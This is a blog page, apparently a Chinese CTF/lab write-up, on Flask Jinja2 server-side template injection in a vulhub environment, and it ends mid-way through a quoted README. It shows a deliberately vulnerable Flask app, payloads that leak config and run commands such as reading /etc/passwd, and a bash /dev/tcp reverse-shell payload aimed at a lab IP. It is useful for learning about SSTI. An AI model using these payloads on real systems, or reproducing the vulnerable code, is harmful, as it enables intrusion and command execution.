@@ -1,0 +1,487 @@
+<!doctype html>
+<html lang="zh"><head>
+<title>Flask SSTI漏洞(Flask SSTI) - X8@0E的博客</title>
+<meta charset="UTF-8">
+<meta name="keywords" content="">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+<meta name="description" content="Flask SSTI漏洞(Flask SSTI)位置flask&#x2F;ssti&#x2F; Flask SSTI（Server-Side Template Injection，服务端模板注入）漏洞是一种由于服务器端模板引擎处理用户输入不当而导致的安全漏洞。攻击者可以通过构造恶意输入，注入并执行模板代码，从而获取敏感信息或执行任意命令。 漏洞原理Flask 是 Python 的轻量级 Web 框">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Flask SSTI漏洞(Flask SSTI)">
+<meta property="og:url" content="http://example.com/2025/09/15/Flask%20SSTI%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="X8@0E的博客">
+<meta property="og:description" content="Flask SSTI漏洞(Flask SSTI)位置flask&#x2F;ssti&#x2F; Flask SSTI（Server-Side Template Injection，服务端模板注入）漏洞是一种由于服务器端模板引擎处理用户输入不当而导致的安全漏洞。攻击者可以通过构造恶意输入，注入并执行模板代码，从而获取敏感信息或执行任意命令。 漏洞原理Flask 是 Python 的轻量级 Web 框">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250915201835970.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250915201951516.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250915202130340.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250915202335281.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250915202816380.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250915203141456.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250915203421348.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250915203631044.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250915210134543.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250915210209798.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250915210239898.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250915210331413.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250915210404818.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250915210557195.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250915211305567.png">
+<meta property="article:published_time" content="2025-09-15T11:59:47.060Z">
+<meta property="article:modified_time" content="2025-09-17T02:26:06.055Z">
+<meta property="article:author" content="X8@0E">
+<meta property="article:tag" content="flask">
+<meta property="article:tag" content="Jinja2">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250915201835970.png">
+
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1761989925299">
+
+<link rel="stylesheet" href="/css/style.css?v=1761989925299">
+
+
+
+
+    
+        <link rel="stylesheet" href="/custom.css?v=1761989925299">
+    
+
+
+
+<script src="/lib/mdui_043tiny/mdui.js" async></script>
+<script src="/lib/fancybox/fancybox.umd.js" async></script>
+<script src="/lib/lax.min.js" async></script>
+
+
+<script async src="/js/app.js?v=1761989925299"></script>
+
+ 
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4D4ZJ9G024"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag("js", new Date());
+
+  gtag("config", "G-4D4ZJ9G024");
+</script>
+
+
+<link rel="stylesheet"  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
+<meta name="generator" content="Hexo 7.3.0"></head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/55f0c32a6a773efe8c6a6a8158a06f18.jpg?x-oss-process=image%2fresize%2cm_lfit%2cw_1920%2ch_1080)"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon" href="/" title="X8@0E"><img src="https://n.sinaimg.cn/sinakd20119/560/w1080h1080/20220924/802a-0c9750f1fa5aa25624c0847a082aaba1.jpg" alt="X8@0E"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="X8@0E">
+            <img src="https://n.sinaimg.cn/sinakd20119/560/w1080h1080/20220924/802a-0c9750f1fa5aa25624c0847a082aaba1.jpg" alt="X8@0E" alt="X8@0E">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>43</div>
+        <div><span>标签</span>77</div>
+        <div><span>分类</span>14</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archives.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-douban-fill"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+    </div>
+    
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+        
+            <form id="search_form">
+                <label><input class="st-default-search-input" id="search_value" name="q" type="search" placeholder="搜索" style="
+                    font-size: 15px !important;
+                    height: 56px !important;
+                    background-image: none;
+                "></label>
+            </form>
+         
+    </div>
+</div>
+
+
+	<script async src="/js/search.js?v=1761989925300"></script>
+
+
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+	<div class="nexmoe-widget nexmoe-social">
+		<a
+			class="mdui-ripple"
+			href="https://blog.csdn.net/2301_81325456/article/details/147025965"
+			target="_blank"
+			mdui-tooltip="{content: 'CSDN'}"
+			style="
+				color: rgb(247, 132, 34);
+				background-color: rgba(247, 132, 34, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-github"
+			></i> </a
+		>
+	</div>
+</div>
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Crypto/">Crypto</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/NSSCTF/">NSSCTF</a>
+          <span class="category-list-count">2</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Vulnhub/">Vulnhub</a>
+          <span class="category-list-count">3</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Vulnvm靶机复现/">Vulnvm靶机复现</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-信息收集/">ctfshow-web-信息收集</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-命令执行/">ctfshow-web-命令执行</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-文件上传/">ctfshow-web-文件上传</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-文件包含/">ctfshow-web-文件包含</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-爆破/">ctfshow-web-爆破</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/sql注入/">sql注入</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/vulhub/">vulhub</a>
+          <span class="category-list-count">7</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/vulnhub/">vulnhub</a>
+          <span class="category-list-count">4</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/群友靶机/">群友靶机</a>
+          <span class="category-list-count">15</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/自制靶机/">自制靶机</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/1Panel/" style="font-size: 10px;">1Panel</a> <a href="/tags/3%E4%B8%AA%E7%82%B9/" style="font-size: 10px;">3个点</a> <a href="/tags/Argon2Cracker/" style="font-size: 10px;">Argon2Cracker</a> <a href="/tags/Cookie-GLOBALS/" style="font-size: 10px;">Cookie--GLOBALS</a> <a href="/tags/Cypher%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">Cypher注入</a> <a href="/tags/DC/" style="font-size: 15px;">DC</a> <a href="/tags/GIF%E7%BB%95%E8%BF%87/" style="font-size: 10px;">GIF绕过</a> <a href="/tags/Jinja2/" style="font-size: 10px;">Jinja2</a> <a href="/tags/JoomScan/" style="font-size: 10px;">JoomScan</a> <a href="/tags/LFI%E5%88%B0RCE-open%E5%87%BD%E6%95%B0/" style="font-size: 10px;">LFI到RCE(open函数)</a> <a href="/tags/NSSCTF/" style="font-size: 15px;">NSSCTF</a> <a href="/tags/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">Nginx解析漏洞</a> <a href="/tags/RSA/" style="font-size: 10px;">RSA</a> <a href="/tags/RUNPATH/" style="font-size: 10px;">RUNPATH</a> <a href="/tags/Rabbit/" style="font-size: 10px;">Rabbit</a> <a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/Vulnhub/" style="font-size: 15px;">Vulnhub</a> <a href="/tags/Vulnvm/" style="font-size: 10px;">Vulnvm</a> <a href="/tags/WAF/" style="font-size: 10px;">WAF</a> <a href="/tags/WPA-01-cap/" style="font-size: 10px;">WPA-01.cap</a> <a href="/tags/aircrack-ng/" style="font-size: 10px;">aircrack-ng</a> <a href="/tags/basic%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4/" style="font-size: 10px;">basic认证爆破</a> <a href="/tags/cgi%E6%96%87%E4%BB%B6/" style="font-size: 10px;">cgi文件</a> <a href="/tags/ctfshow/" style="font-size: 20px;">ctfshow</a> <a href="/tags/dirtycow/" style="font-size: 10px;">dirtycow</a> <a href="/tags/docker%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/" style="font-size: 10px;">docker交互式shell</a> <a href="/tags/drupal/" style="font-size: 10px;">drupal</a> <a href="/tags/ffuf/" style="font-size: 10px;">ffuf</a> <a href="/tags/flask/" style="font-size: 10px;">flask</a> <a href="/tags/fork%E8%A7%A3%E5%86%B3%E6%96%AD%E8%BF%9E/" style="font-size: 10px;">fork解决断连</a> <a href="/tags/ftp/" style="font-size: 10px;">ftp</a> <a href="/tags/ghfs/" style="font-size: 10px;">ghfs</a> <a href="/tags/ldd/" style="font-size: 10px;">ldd</a> <a href="/tags/les-sh/" style="font-size: 10px;">les.sh</a> <a href="/tags/linpeas-sh/" style="font-size: 10px;">linpeas.sh</a> <a href="/tags/lsattr-%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%B1%9E%E6%80%A7/" style="font-size: 10px;">lsattr--查看文件扩展属性</a> <a href="/tags/motto/" style="font-size: 10px;">motto</a> <a href="/tags/msfvenom/" style="font-size: 15px;">msfvenom</a> <a href="/tags/mysql-old-password/" style="font-size: 10px;">mysql_old_password</a> <a href="/tags/nikto/" style="font-size: 10px;">nikto</a> <a href="/tags/nohup/" style="font-size: 10px;">nohup</a> <a href="/tags/php%E6%8F%90%E6%9D%83root/" style="font-size: 10px;">php提权root</a> <a href="/tags/poc/" style="font-size: 10px;">poc</a> <a href="/tags/put%E6%96%B9%E6%B3%95/" style="font-size: 10px;">put方法</a> <a href="/tags/python3-5/" style="font-size: 10px;">python3.5</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/readelf/" style="font-size: 10px;">readelf</a> <a href="/tags/scp/" style="font-size: 10px;">scp</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="/tags/sql%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">sql二次注入</a> <a href="/tags/ssh%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4/" style="font-size: 10px;">ssh弱口令爆破</a> <a href="/tags/ssh%E7%A7%98%E9%92%A5%E7%94%9F%E6%88%90%E8%BF%9E%E6%8E%A5/" style="font-size: 10px;">ssh秘钥生成连接</a> <a href="/tags/stegseek/" style="font-size: 10px;">stegseek</a> <a href="/tags/suForce/" style="font-size: 10px;">suForce</a> <a href="/tags/url%E6%88%AA%E6%96%AD/" style="font-size: 10px;">url截断</a> <a href="/tags/vite/" style="font-size: 10px;">vite</a> <a href="/tags/web%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">web命令执行</a> <a href="/tags/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">web文件上传</a> <a href="/tags/web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 10px;">web文件包含</a> <a href="/tags/web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/" style="font-size: 10px;">web源码泄露</a> <a href="/tags/web%E7%88%86%E7%A0%B4/" style="font-size: 10px;">web爆破</a> <a href="/tags/x-forwarded-for%E7%9A%84ip%E6%AC%BA%E9%AA%97/" style="font-size: 10px;">x-forwarded-for的ip欺骗</a> <a href="/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2025-30208/" style="font-size: 10px;">任意文件读取漏洞(CVE-2025-30208)</a> <a href="/tags/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81/" style="font-size: 10px;">凯撒密码</a> <a href="/tags/%E5%90%8E%E9%9D%A2%E5%8A%A0-jpg%E5%90%8E%E7%BC%80/" style="font-size: 10px;">后面加.jpg后缀</a> <a href="/tags/%E5%9F%9F%E6%8E%A7/" style="font-size: 10px;">域控</a> <a href="/tags/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/" style="font-size: 10px;">密码爆破</a> <a href="/tags/%E6%8F%90%E6%9D%83-env-reset/" style="font-size: 10px;">提权!env_reset</a> <a href="/tags/%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">插件漏洞</a> <a href="/tags/%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5-ua%E6%B7%BB%E5%8A%A0%E6%9C%A8%E9%A9%AC/" style="font-size: 10px;">日志注入+ua添加木马</a> <a href="/tags/%E6%AD%A3%E5%90%91shell/" style="font-size: 10px;">正向shell</a> <a href="/tags/%E7%8A%B6%E6%80%81%E7%A0%81/" style="font-size: 10px;">状态码</a> <a href="/tags/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/" style="font-size: 10px;">环境变量</a> <a href="/tags/%E7%A9%BA%E6%A0%BC/" style="font-size: 10px;">空格</a> <a href="/tags/%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81/" style="font-size: 10px;">维吉尼亚密码</a> <a href="/tags/%E8%9A%81%E5%89%91/" style="font-size: 10px;">蚁剑</a> <a href="/tags/%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96/" style="font-size: 10px;">越界读取</a>
+    </div>
+    
+      <script>
+        var maxTagcloud = parseInt(17);
+        var tags_length = parseInt(77);
+        var tags_arr = [];
+        for(var i = 0; i < tags_length; i++){
+          tags_arr.push(i);
+        }
+        tags_arr.sort(function (l, r) {
+          return Math.random() > 0.5 ? -1 : 1;
+        });
+        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
+        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
+          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
+        }
+      </script>
+    
+  </div>
+
+    
+        
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/">2025</a><span class="archive-list-count">43</span></li></ul>
+    </div>
+  </div>
+
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">最新文章</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/10/20/Crypto/">Crypto</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/11/%E6%B5%81%E9%87%8F%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/">流量分析恶意攻击</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/10/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">流量分析</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/09/hackableII/">hackablell</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/07/Me-and-My-Girlfriend-1/">Me-and-My-Girlfriend-1</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-link">
+		<ul>
+        
+            <li>
+                <a href="" target="_blank" >
+                    <img src="https://n.sinaimg.cn/sinakd20119/560/w1080h1080/20220924/802a-0c9750f1fa5aa25624c0847a082aaba1.jpg" alt="X8@0E"></img>
+                    <p>X8@0E</p>
+                </a>
+            </li>
+        
+		</ul>
+    </div>
+</div>
+<style>
+.nexmoe-widget-wrap .nexmoe-link ul li a {
+    text-align : center;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a img {
+    max-width : 100%;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a p {
+    margin: 10px 0;
+}
+</style>
+
+    
+   
+    <div class="nexmoe-copyright">
+        &copy; 2025 X8@0E
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        
+    </div>
+</div><!-- .nexmoe-drawer --></div><div id="nexmoe-content"><div class="nexmoe-primary"><div class="nexmoe-post">
+  <article>
+    
+        <div class="nexmoe-post-cover absolute" style="padding-top: NaN%;"> 
+            <img src="https://img.shetu66.com/2024/06/03/171742957182220579.png" alt="Flask SSTI漏洞(Flask SSTI)" loading="lazy">
+            <h1>Flask SSTI漏洞(Flask SSTI)</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2025年09月15日</a>
+        
+            <a class="nexmoefont icon-appstore-fill -link" href="/categories/vulhub/">vulhub</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h1 id="Flask-SSTI漏洞-Flask-SSTI"><a href="#Flask-SSTI漏洞-Flask-SSTI" class="headerlink" title="Flask SSTI漏洞(Flask SSTI)"></a>Flask SSTI漏洞(Flask SSTI)</h1><h2 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h2><p>flask&#x2F;ssti&#x2F;</p>
+<p>Flask SSTI（Server-Side Template Injection，服务端模板注入）漏洞是一种由于服务器端模板引擎处理用户输入不当而导致的安全漏洞。攻击者可以通过构造恶意输入，注入并执行模板代码，从而获取敏感信息或执行任意命令。</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Flask 是 Python 的轻量级 Web 框架，默认使用 Jinja2 作为模板引擎。当应用直接将用户输入嵌入到模板中，而未经过充分过滤或转义时，攻击者可以注入恶意的 Jinja2 表达式，导致代码执行。</p>
+<p>例如，将下面的代码复制保存到文件1.py中，而1.py最好是在kali虚拟机里面执行，因为如果在本机执行的话有些模块没有需要安装，需要pip3  install  flask安装flask。<strong>服务器端模板注入（SSTI - Server-Side Template Injection）</strong>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>py</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/search&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>():</span><br><span class="line">  res= request.args.get(<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  template = <span class="string">f&quot;Hello, <span class="subst">&#123;res&#125;</span>!&quot;</span>  <span class="comment"># 直接将用户输入嵌入模板</span></span><br><span class="line">  <span class="keyword">return</span> render_template_string(template)  <span class="comment"># 危险！</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  app.run()</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250915201835970.png" alt="image-20250915201835970" data-caption="image-20250915201835970" loading="lazy"></p>
+<p>用kali里面的浏览器访问5000端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/search?id=&#123;&#123;7*7&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res 的值是 &#x27;&#123;&#123;7*7&#125;&#125;&#x27;。</span><br><span class="line">template 变量变成 f&quot;Hello, &#123;&#123;7*7&#125;&#125;!&quot;。</span><br><span class="line">render_template_string 函数会解析和执行 &#123;&#123;7*7&#125;&#125; 这部分模板语法，计算 7*7 的结果。</span><br><span class="line">页面显示：Hello, 49!</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250915201951516.png" alt="image-20250915201951516" data-caption="image-20250915201951516" loading="lazy"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/search?id=&#123;&#123;config&#125;&#125;   // 泄露Flask配置</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250915202130340.png" alt="image-20250915202130340" data-caption="image-20250915202130340" loading="lazy"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/search?id=&#123;&#123;url_for.__globals__&#125;&#125;  # 泄露Flask配置</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250915202335281.png" alt="image-20250915202335281" data-caption="image-20250915202335281" loading="lazy"></p>
+<p>如果不想只用127.0.0.1，不限制IP访问的话就可以把1.py的最后一行修改成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.run(host=&#x27;0.0.0.0&#x27;,port=5005)</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250915202816380.png" alt="image-20250915202816380" data-caption="image-20250915202816380" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250915203141456.png" alt="image-20250915203141456" data-caption="image-20250915203141456" loading="lazy"></p>
+<p>多了一个kali的IP访问：<a target="_blank" rel="noopener" href="http://192.168.196.128:5005/">http://192.168.196.128:5005</a> ，所有跟kali互通的都可以用浏览器访问这个IP</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250915203421348.png" alt="image-20250915203421348" data-caption="image-20250915203421348" loading="lazy"></p>
+<p>利用 Python 的内置类和函数执行系统命令</p>
+<h2 id="读取系统文件"><a href="#读取系统文件" class="headerlink" title="读取系统文件"></a>读取系统文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; get_flashed_messages.__globals__[&#x27;os&#x27;].popen(&#x27;cat /etc/passwd&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250915203631044.png" alt="image-20250915203631044" data-caption="image-20250915203631044" loading="lazy"></p>
+<p>反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; get_flashed_messages.__globals__[&#x27;os&#x27;].system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.196.128/1234 0&gt;&amp;1&quot;&#x27;) &#125;&#125;   //没成功</span><br></pre></td></tr></table></figure>
+
+<p>关于FLASK SSTI的CTF题目挺多的</p>
+<h1 id="开启环境"><a href="#开启环境" class="headerlink" title="开启环境"></a>开启环境</h1><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250915210134543.png" alt="image-20250915210134543" data-caption="image-20250915210134543" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250915210209798.png" alt="image-20250915210209798" data-caption="image-20250915210209798" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250915210239898.png" alt="image-20250915210239898" data-caption="image-20250915210239898" loading="lazy"></p>
+<h2 id="参考vulhub里的wp"><a href="#参考vulhub里的wp" class="headerlink" title="参考vulhub里的wp"></a>参考vulhub里的wp</h2><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250915210331413.png" alt="image-20250915210331413" data-caption="image-20250915210331413" loading="lazy"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">└─# cat README.zh-cn.md      </span><br><span class="line"># Flask（Jinja2）服务端模板注入漏洞</span><br><span class="line"></span><br><span class="line">Flask是一个流行的Python Web框架，使用Jinja2作为其模板引擎。当用户输入未经适当过滤就直接在Jinja2模板中渲染时，可能会导致服务端模板注入（SSTI）漏洞，进而可能导致远程代码执行。</span><br><span class="line"></span><br><span 